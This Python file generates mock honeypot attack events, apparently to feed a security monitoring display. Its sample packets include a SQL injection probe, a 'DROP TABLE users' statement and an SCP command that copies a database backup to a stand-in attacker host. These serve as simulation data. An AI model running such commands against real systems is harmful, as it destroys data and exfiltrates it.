import asyncio
import random
from pydantic import BaseModel

class AttackerEvent(BaseModel):
    id: str
    action: str
    target: str
    tools: list[str]
    mitre_id: str
    attacker_ip: str
    attacker_location: str
    raw_packet: str

# A mock generator that yields attacker events indefinitely
async def simulate_attack_sequence():
    """Generates a sequence of mock events reflecting an attacker navigating the honeypot."""
    events = [
        {
            "action": "SCAN", "target": "WAN", "tools": ["Nmap", "Masscan"], "mitre": "T1046", "delay": 2,
            "ip": "185.122.4.15", "location": "Moscow, RU", "packet": "GET / HTTP/1.1\r\nHost: target.org\r\nUser-Agent: Nmap ..."
        },
        {
            "action": "BRUTE_FORCE", "target": "WEB_FA1", "tools": ["Hydra"], "mitre": "T1110", "delay": 3,
            "ip": "185.122.4.15", "location": "Moscow, RU", "packet": "POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nuser=admin&pass=123456"
        },
        {
            "action": "EXPLOIT", "target": "WEB_FA1", "tools": ["BurpSuite"], "mitre": "T1210", "delay": 2,
            "ip": "45.10.88.22", "location": "Beijing, CN", "packet": "GET /admin?id=1' OR 1=1 -- HTTP/1.1\r\nCookie: session=xyz..."
        },
        {
            "action": "INJECT", "target": "DB_FA1", "tools": ["SQLMap"], "mitre": "T1190", "delay": 3,
            "ip": "45.10.88.22", "location": "Beijing, CN", "packet": "DROP TABLE users; --"
        },
        {
            "action": "DATA_EXFIL", "target": "DB_FA1", "tools": ["Custom Script"], "mitre": "T1041", "delay": 2,
            "ip": "91.22.4.101", "location": "Kiev, UA", "packet": "SCP db_backup.sql attacker@exfil.srv:/tmp/"
        },
    ]
    
    i = 0
    while True:
        event = events[i % len(events)]
        # Add slight jitter to delay
        await asyncio.sleep(event["delay"] + random.uniform(-0.5, 0.5))
        
        yield AttackerEvent(
            id=f"evt_{i}",
            action=event["action"],
            target=event["target"],
            tools=event["tools"],
            mitre_id=event["mitre"],
            attacker_ip=event["ip"],
            attacker_location=event["location"],
            raw_packet=event["packet"]
        )
        i += 1
